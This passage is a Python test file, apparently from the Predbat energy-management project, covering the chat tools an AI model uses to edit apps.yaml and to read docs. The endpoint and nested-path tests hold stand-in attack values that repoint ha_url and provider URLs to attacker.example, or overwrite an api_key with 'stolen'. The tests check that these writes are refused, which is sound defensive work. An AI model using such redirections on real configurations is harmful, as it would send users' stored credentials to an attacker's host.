    ruamel.yaml with preserve_quotes rather than a plain yaml.safe_dump - a plain dump would still
    round-trip the new value correctly but would silently drop every comment and blank line in the
    fixture, and only this check would notice.
    """
    failed = False
    print("**** Testing set_apps_config succeeds, preserves formatting, and backs up ****")
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    original_args_value = my_predbat.args.get("num_inverters")
    try:
        apps_path = _apps_yaml_fixture(root)
        backup_path = apps_path + ".backup"
        original_lines = open(apps_path, "r", encoding="utf-8").read().splitlines()
        my_predbat.args["num_inverters"] = 1

        result = set_apps_config(my_predbat, "num_inverters", 2, apps_yaml_path=apps_path, backup_path=backup_path)

        if not result.get("success"):
            print("ERROR: a valid change was refused: {}".format(result))
            return True
        if APPS_YAML_RESTART_WARNING not in str(result.get("description", "")):
            print("ERROR: the success result did not repeat the restart warning: {}".format(result))
            failed = True
        data = result.get("data") or {}
        if data.get("previous_value") != 1 or data.get("new_value") != 2:
            print("ERROR: the result did not report the previous and new values correctly: {}".format(data))
            failed = True

        if not os.path.exists(backup_path):
            print("ERROR: no backup was created before saving")
            failed = True
        elif open(backup_path, "r", encoding="utf-8").read().splitlines() != original_lines:
            print("ERROR: the backup does not match the original file")
            failed = True

        new_lines = open(apps_path, "r", encoding="utf-8").read().splitlines()
        if len(new_lines) != len(original_lines):
            print("ERROR: the line count changed - formatting was not preserved: {} vs {}".format(len(original_lines), len(new_lines)))
            failed = True
        else:
            diffs = [(i, a, b) for i, (a, b) in enumerate(zip(original_lines, new_lines)) if a != b]
            if len(diffs) != 1:
                print("ERROR: more than the changed line differs - comments/formatting were not preserved: {}".format(diffs))
                failed = True
            elif "num_inverters: 2" not in diffs[0][2]:
                print("ERROR: the one changed line is not the expected num_inverters update: {}".format(diffs[0]))
                failed = True

        if my_predbat.args.get("num_inverters") != 2:
            print("ERROR: the running config (base.args) was not updated: {}".format(my_predbat.args.get("num_inverters")))
            failed = True
    finally:
        my_predbat.args["num_inverters"] = original_args_value
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_validate_apps_schema_type(my_predbat):
    """validate_apps_schema_type checks a value's shape against APPS_SCHEMA, permissively for a
    key with no schema entry at all - not every apps.yaml key is declared there."""
    failed = False
    print("**** Testing validate_apps_schema_type ****")
    cases = [
        ("num_inverters", 2, True),  # integer type, valid
        ("num_inverters", "2", False),  # integer type, wrong shape
        ("carbon_automatic", True, True),  # boolean type, valid
        ("carbon_automatic", "true", False),  # boolean type, wrong shape (a real bool is wanted)
        ("ha_url", "http://homeassistant.local:8123", True),  # string type, valid
        ("ha_url", 123, False),  # string type, wrong shape
        ("this_key_has_no_schema_entry", {"anything": "goes"}, True),  # no schema entry - always accepted
    ]
    for key, value, expect_ok in cases:
        error = validate_apps_schema_type(key, value)
        ok = error is None
        if ok != expect_ok:
            print("ERROR: validate_apps_schema_type({!r}, {!r}) returned {!r}, expected {}".format(key, value, error, "no error" if expect_ok else "an error"))
            failed = True
    return failed


def test_set_apps_config_refuses_endpoint_keys(my_predbat):
    """A key that decides where an existing credential is sent is refused, file untouched.

    Guarding credential values alone is not enough: ha_key never changes, but repointing ha_url
    sends that unchanged token to whichever host the new value names, and openrouter_base_url
    does the same for openrouter_api_key. Neither matches is_secret_key, so before
    is_endpoint_key() both were accepted.

    Mutation check: removing the is_endpoint_key() guard in set_apps_config() makes this fail on
    both keys - the call succeeds and the url line in apps.yaml changes.
    """
    failed = False
    print("**** Testing set_apps_config refuses endpoint redirection keys ****")
    # A fixture that actually CONTAINS the endpoint keys. With the shared fixture, which does
    # not, set_apps_config refuses them as "not found in apps.yaml" and this test would pass
    # whether or not the endpoint guard existed - caught by mutation-testing the guard away.
    endpoint_yaml = FIXTURE_APPS_YAML.rstrip("\n") + '\n  ha_url: "http://homeassistant.local:8123"\n  openrouter_base_url: "https://openrouter.ai/api/v1"\n'

    for key, value in (("ha_url", "http://attacker.example:8123"), ("openrouter_base_url", "http://attacker.example/v1")):
        root = tempfile.mkdtemp(prefix="predbat_apps_")
        try:
            apps_path = os.path.join(root, "apps.yaml")
            with open(apps_path, "w", encoding="utf-8") as handle:
                handle.write(endpoint_yaml)
            backup_path = apps_path + ".backup"
            original = open(apps_path, "r", encoding="utf-8").read()

            result = set_apps_config(my_predbat, key, value, apps_yaml_path=apps_path, backup_path=backup_path)

            if result.get("success"):
                print("ERROR: endpoint key {} was accepted: {}".format(key, result))
                failed = True
            if "credentials" not in str(result.get("error", "")).lower():
                print("ERROR: {} was refused for the wrong reason: {}".format(key, result))
                failed = True
            if open(apps_path, "r", encoding="utf-8").read() != original:
                print("ERROR: apps.yaml was modified despite refusing {}".format(key))
                failed = True
            if os.path.exists(backup_path):
                print("ERROR: a backup was created for a refused write of {}".format(key))
                failed = True
        finally:
            shutil.rmtree(root, ignore_errors=True)

    # The suffix rule must not swallow ordinary keys that happen to be near-misses.
    for benign in ("battery_size", "inverter_type", "urls_per_day"):
        if is_endpoint_key(benign):
            print("ERROR: is_endpoint_key({}) is True, which would block a legitimate change".format(benign))
            failed = True
    # "url" is explicit rather than covered by the suffix rule, which only matches "_url". The
    # chat: block's provider entries pair a bare url with an api_key, so leaving it out would let
    # a provider's endpoint be repointed and its unchanged key delivered to the new host - the
    # exact attack the endpoint guard exists to stop, through the one key shape it did not cover.
    for endpoint in ("url", "ha_url", "openrouter_base_url", "givtcp_host", "some_new_endpoint"):
        if not is_endpoint_key(endpoint):
            print("ERROR: is_endpoint_key({}) is False, leaving a redirection key changeable".format(endpoint))
            failed = True

    # And through a real nested write, not just the predicate: the guard runs per path segment, so
    # a leaf named "url" has to be caught even though no other segment of the path looks dangerous.
    provider_yaml = FIXTURE_APPS_YAML.rstrip("\n") + "\n  chat:\n    providers:\n      openrouter:\n        url: 'https://openrouter.ai/api/v1'\n        api_key: 'sk-or-secret'\n"
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    try:
        apps_path = os.path.join(root, "apps.yaml")
        with open(apps_path, "w", encoding="utf-8") as handle:
            handle.write(provider_yaml)
        original = open(apps_path, "r", encoding="utf-8").read()
        result = set_apps_config(my_predbat, "chat.providers.openrouter.url", "http://attacker.example/v1", apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if result.get("success"):
            print("ERROR: a provider's url was repointed through chat: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml was modified despite refusing the provider url change")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_set_apps_config_nested_paths(my_predbat):
    """A nested path changes one value inside a structure without touching a sibling credential.

    This is the whole point of accepting a path: forecast_solar is a list of dicts each holding
    its own api_key, so before this the only way to change a roof's azimuth was to write the
    entire list back - and since get_apps_config masks the key, that round trip stored the
    literal 'xxx' over a live credential.

    Mutation checks: reverting the existence check to 'key in section' makes the accepted path
    below fail as "not found"; dropping the per-segment credential loop makes the api_key path
    succeed; dropping find_redacted_secret_overwrite makes the container write succeed and
    replace the key with 'xxx'.
    """
    failed = False
    print("**** Testing set_apps_config nested paths ****")

    # my_predbat is shared across the whole suite, so args must be restored however this exits -
    # leaving a fixture's args in place breaks unrelated tests that run later, which is exactly
    # what happened the first time this test was written.
    saved_args = my_predbat.args
    try:
        failed = _nested_path_checks(my_predbat)
    finally:
        my_predbat.args = saved_args
    return failed


def _nested_path_checks(my_predbat):
    """Body of test_set_apps_config_nested_paths, with my_predbat.args restored by its caller."""
    failed = False

    nested_yaml = """pred_bat:
  num_inverters: 1
  forecast_solar:
  - postcode: 'SW1A 1AA'
    azimuth: 180
    api_key: REAL-FORECAST-SOLAR-KEY
"""
    real_key = "REAL-FORECAST-SOLAR-KEY"

    def _fixture():
        """Write the nested fixture to a fresh temp dir, returning (root, path)."""
        root = tempfile.mkdtemp(prefix="predbat_apps_")
        path = os.path.join(root, "apps.yaml")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(nested_yaml)
        return root, path

    def _live_args():
        """The args dict Predbat would be holding for this fixture."""
        return {"num_inverters": 1, "forecast_solar": [{"postcode": "SW1A 1AA", "azimuth": 180, "api_key": real_key}]}

    # A nested path is accepted, changes only the value named, and leaves the key alone.
    root, apps_path = _fixture()
    try:
        my_predbat.args = _live_args()
        result = set_apps_config(my_predbat, "forecast_solar[0].azimuth", 90, apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if not result.get("success"):
            print("ERROR: a nested path was refused: {}".format(result))
            failed = True
        written = open(apps_path, "r", encoding="utf-8").read()
        if "azimuth: 90" not in written:
            print("ERROR: the nested write did not change azimuth:\n{}".format(written))
            failed = True
        if real_key not in written:
            print("ERROR: the nested write damaged the sibling api_key:\n{}".format(written))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A nested path whose leaf names a credential is refused.
    root, apps_path = _fixture()
    try:
        my_predbat.args = _live_args()
        original = open(apps_path, "r", encoding="utf-8").read()
        result = set_apps_config(my_predbat, "forecast_solar[0].api_key", "stolen", apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if result.get("success"):
            print("ERROR: a nested credential path was accepted: {}".format(result))
            failed = True
        if "credential" not in str(result.get("error", "")).lower():
            print("ERROR: the nested credential refusal did not explain why: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml changed despite refusing the nested credential path")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # Writing a whole container back, carrying the mask the model was shown, is refused.
    root, apps_path = _fixture()
    try:
        my_predbat.args = _live_args()
        original = open(apps_path, "r", encoding="utf-8").read()
        as_the_model_saw_it = mask_secret_args({"forecast_solar": _live_args()["forecast_solar"]})["forecast_solar"]
        as_the_model_saw_it[0]["azimuth"] = 90
        result = set_apps_config(my_predbat, "forecast_solar", as_the_model_saw_it, apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if result.get("success"):
            print("ERROR: a container write carrying the redaction placeholder was accepted: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml changed despite refusing the clobbering container write")
            failed = True
        if real_key not in open(apps_path, "r", encoding="utf-8").read():
            print("ERROR: the real credential was destroyed by a refused write")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A container write that carries the credential through unchanged is still allowed - the
    # guard must catch the mask, not block every list edit.
    root, apps_path = _fixture()
    try:
        my_predbat.args = _live_args()
        intact = [{"postcode": "SW1A 1AA", "azimuth": 90, "api_key": real_key}]
        result = set_apps_config(my_predbat, "forecast_solar", intact, apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if not result.get("success"):
            print("ERROR: a container write carrying the real credential was refused: {}".format(result))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A credential in a NON-leaf segment is refused. This is what the per-segment loop is for and
    # a whole-path check cannot do: is_secret_key matches on substrings, so testing the joined
    # path string catches "forecast_solar[0].api_key" by accident - but "password.token_expires"
    # ends with the exempt suffix "_expires", so the joined string is judged safe while the
    # segment "password" is plainly not.
    secret_parent_yaml = """pred_bat:
  num_inverters: 1
  password:
    token_expires: 100
"""
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    try:
        apps_path = os.path.join(root, "apps.yaml")
        with open(apps_path, "w", encoding="utf-8") as handle:
            handle.write(secret_parent_yaml)
        original = open(apps_path, "r", encoding="utf-8").read()
        my_predbat.args = {"num_inverters": 1, "password": {"token_expires": 100}}
        result = set_apps_config(my_predbat, "password.token_expires", 200, apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
        if result.get("success"):
            print("ERROR: a path descending through a credential key was accepted: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml changed despite refusing a path through a credential key")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A path into something that does not exist is still refused, and refused before any backup.
    root, apps_path = _fixture()
    try:
        my_predbat.args = _live_args()
        for bad in ("forecast_solar[7].azimuth", "forecast_solar[0].no_such_field", "no_such_key.child"):
            result = set_apps_config(my_predbat, bad, 1, apps_yaml_path=apps_path, backup_path=apps_path + ".backup")
            if result.get("success"):
                print("ERROR: nonexistent path {} was accepted".format(bad))
                failed = True
            if os.path.exists(apps_path + ".backup"):
                print("ERROR: a backup was taken for the refused path {}".format(bad))
                failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)

    return failed


def test_yaml_path_splitter_handles_nested_indices(my_predbat):
    """A path with more than one index parses, rather than raising.

    parse_yaml_path split on the first "[" and unpacked into exactly two parts, so any path with
    a directly nested index - "foo[0][1]" - raised ValueError instead of returning anything. That
    is reachable from set_apps_config, where it surfaced as a failed tool call against the user's
    real configuration.

    Found when merging main, which had independently grown the same capability for the apps.yaml
    editor (WebInterface._split_yaml_path) and got it right. This adopts that algorithm.

    Mutation check: restoring the split("[") version raises on the nested case below.
    """
    failed = False
    print("**** Testing the YAML path splitter handles nested indices ****")

    cases = {
        "plain": ["plain"],
        "x[0]": ["x", "[0]"],
        "forecast_solar[0].azimuth": ["forecast_solar", "[0]", "azimuth"],
        "a.b[2].c": ["a", "b", "[2]", "c"],
        # The case that used to raise.
        "foo[0][1]": ["foo", "[0]", "[1]"],
    }
    for path, expected in cases.items():
        try:
            actual = parse_yaml_path(path)
        except Exception as error:
            print("ERROR: parse_yaml_path({!r}) raised {}: {}".format(path, type(error).__name__, error))
            failed = True
            continue
        if actual != expected:
            print("ERROR: parse_yaml_path({!r}) returned {}, expected {}".format(path, actual, expected))
            failed = True

    return failed


DOCS_FIXTURE = {
    "docs": [
        {"location": "apps-yaml/", "title": "apps.yaml settings", "text": "intro about apps yaml " + ("solcast " * 40)},
        {"location": "apps-yaml/#solcast", "title": "Solcast", "text": "solcast api key goes here " * 5},
        {"location": "apps-yaml/#cars", "title": "Cars", "text": "car charging settings " * 5},
        {"location": "faq/", "title": "FAQ", "text": "a page with no matching section, solcast mentioned once"},
        {"location": "superpowers/plans/whatever/", "title": "Internal plan", "text": "solcast " * 200},
        # Numbered so a chunk read at an offset is distinguishable from the first one - all-identical
        # filler would make the offset assertion pass whether or not the offset was honoured.
        {"location": "long/#big", "title": "Big", "text": "".join("[{}]".format(n % 10) for n in range(DOCS_READ_MAX_CHARS))},
    ]
}


class _DocsCache:
    """Stands in for Storage, always returning the fixture index."""

    async def fetch_cached(self, *args, **kwargs):
        """Return the fixture rather than fetching anything."""
        return DOCS_FIXTURE


def test_search_docs_prefers_sections_and_hides_internal_docs(my_predbat):
    """Search returns precise sections, never internal design docs, and says what a read costs.

    Three things the index makes necessary. It carries a record per page AND per section, and the
    page record holds every section's text - so it outscores the sections it contains and would
    win every search, pointing the model at 137000 characters when a 2000-character section
    answers the question. It also publishes this project's own design specs under superpowers/,
    which are notes about building Predbat rather than instructions for using it. And a result is
    only actionable if it carries the handle read_docs takes.

    A page record is dropped only when one of its own sections matched, not unconditionally: the
    page record also holds the intro before the first heading, which belongs to no section.

    Mutation checks: removing the exclusion, the section preference, or the section/length fields,
    each fails below.
    """
    failed = False
    print("**** Testing search_docs prefers sections and hides internal docs ****")

    hits = score_documents(DOCS_FIXTURE["docs"], "solcast api key", max_results=10)
    sections = [hit["section"] for hit in hits]

    if any(section.startswith("superpowers/") for section in sections):
        print("ERROR: internal design docs are searchable: {}".format(sections))
        failed = True
    # The page record loses to its own sections.
    if "apps-yaml/" in sections:
        print("ERROR: the page record outranked its own sections: {}".format(sections))
        failed = True
    if "apps-yaml/#solcast" not in sections:
        print("ERROR: the matching section is missing: {}".format(sections))
        failed = True
    # But a page whose sections did not match keeps its page record, or its intro text becomes
    # unsearchable.
    if "faq/" not in sections:
        print("ERROR: a page with no matching section was dropped too: {}".format(sections))
        failed = True

    for hit in hits:
        if "section" not in hit or "length" not in hit:
            print("ERROR: a result carries no section handle or length: {}".format(hit))
            failed = True

    return failed


def test_read_docs_returns_one_section_and_pages(my_predbat):
    """read_docs serves a single section from the cache, paging anything oversized.

    Served from the index rather than the web: the index already carries every page's text, so
    this needs no network call and no HTML stripping. The alternative - fetch_url on a docs page -
    returns navigation and every unrelated section too: measured on the apps.yaml page that is
    141000 characters, about 35000 tokens, for a question one section answers in a few hundred.

    Mutation checks: dropping the length cap, or the next_offset, each fails below.
    """
    failed = False
    print("**** Testing read_docs returns one section and pages ****")

    result = asyncio.run(read_docs(_DocsCache(), "apps-yaml/#solcast"))
    if not result.get("success"):
        print("ERROR: a known section could not be read: {}".format(result))
        return True
    data = result["data"]
    if "solcast api key" not in data["text"]:
        print("ERROR: the section text is wrong: {}".format(data))
        failed = True
    if data.get("next_offset") is not None:
        print("ERROR: a short section was paged: {}".format(data))
        failed = True

    # Oversized sections are capped and say where to continue, rather than truncated silently.
    result = asyncio.run(read_docs(_DocsCache(), "long/#big"))
    data = result["data"]
    if len(data["text"]) != DOCS_READ_MAX_CHARS:
        print("ERROR: the read was not capped at {}: got {}".format(DOCS_READ_MAX_CHARS, len(data["text"])))
        failed = True
    if data.get("next_offset") != DOCS_READ_MAX_CHARS:
        print("ERROR: a capped read does not say where to continue: {}".format(data))
        failed = True
    if str(DOCS_READ_MAX_CHARS) not in str(result.get("description")):
        print("ERROR: the description does not tell the model how to get the rest: {}".format(result.get("description")))
        failed = True

    # The offset actually moves.
    result = asyncio.run(read_docs(_DocsCache(), "long/#big", offset=DOCS_READ_MAX_CHARS))
    if result["data"]["offset"] != DOCS_READ_MAX_CHARS or result["data"]["text"] == data["text"]:
        print("ERROR: reading from an offset returned the same chunk: {}".format(result["data"]["offset"]))
        failed = True

    # Internal docs are unreadable even when named directly - the search filter alone would leave
    # them reachable by a model that guessed or remembered a path.
    result = asyncio.run(read_docs(_DocsCache(), "superpowers/plans/whatever/"))
    if result.get("success"):
        print("ERROR: an internal design doc was readable by direct id: {}".format(result))
        failed = True

    # An unknown section fails with something the model can act on.
    result = asyncio.run(read_docs(_DocsCache(), "no/such/#thing"))
    if result.get("success") or "search_docs" not in str(result.get("error")):
        print("ERROR: an unknown section did not point back at search_docs: {}".format(result))
        failed = True

    return failed


def run_chat_tools_tests(my_predbat):
    """Run every chat-only tool test, returning True if any of them failed."""
    failed = False
    failed |= test_chat_tool_defs_shape(my_predbat)
    failed |= test_score_documents(my_predbat)
    failed |= test_search_docs_uses_the_cache(my_predbat)
    failed |= test_search_docs_prefers_sections_and_hides_internal_docs(my_predbat)
    failed |= test_read_docs_returns_one_section_and_pages(my_predbat)
    failed |= test_search_source(my_predbat)
    failed |= test_search_source_rejects_bad_patterns(my_predbat)
    failed |= test_read_source(my_predbat)
    failed |= test_read_source_refuses_everything_it_should(my_predbat)
    failed |= test_search_source_bounds_a_single_large_file(my_predbat)
    failed |= test_source_extension_matching_edge_cases(my_predbat)
    failed |= test_host_allowlist(my_predbat)
    failed |= test_validate_fetch_target(my_predbat)
    failed |= test_html_to_text(my_predbat)
    failed |= test_fetch_url_refusals_are_results(my_predbat)
    failed |= test_validate_fetch_target_checks_every_resolved_address(my_predbat)
    failed |= test_fetch_url_revalidates_every_redirect_hop(my_predbat)
    failed |= test_fetch_url_malformed_inputs_return_results(my_predbat)
    failed |= test_set_apps_config_requires_a_key(my_predbat)
    failed |= test_set_apps_config_refuses_credential_key(my_predbat)
    failed |= test_set_apps_config_refuses_endpoint_keys(my_predbat)
    failed |= test_set_apps_config_nested_paths(my_predbat)
    failed |= test_yaml_path_splitter_handles_nested_indices(my_predbat)
    failed |= test_set_apps_config_refuses_unknown_key(my_predbat)
    failed |= test_set_apps_config_refuses_a_schema_type_mismatch(my_predbat)
    failed |= test_set_apps_config_success_preserves_formatting_backs_up_and_mirrors_args(my_predbat)
    failed |= test_validate_apps_schema_type(my_predbat)
    return failed
